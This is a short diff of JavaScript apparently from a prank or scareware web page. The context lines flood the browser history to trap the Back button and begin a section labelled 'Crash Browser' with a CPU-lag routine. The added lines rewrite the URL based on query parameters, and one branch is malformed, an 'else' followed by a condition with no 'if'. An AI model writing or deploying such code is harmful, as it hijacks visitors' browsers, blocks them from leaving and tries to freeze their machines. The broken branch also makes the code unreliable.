@@ -86,6 +86,11 @@ function playVideos() {
   for (let i = 0; i < 20; i++) {
     history.pushState(null, "", location.href + "?p=" + i);
   }
+  if (params.has("refsu")) {
+    history.replaceState(null, "", location.pathname + "?refsu");
+  } else (params.has("obs")) {
+    history.replaceState(null, "", location.pathname + "?obs");
+  }
   // 7. Crash Browser
   function activateCPULag() {
     if (cpuLagActive) return; // Prevent multiple activations
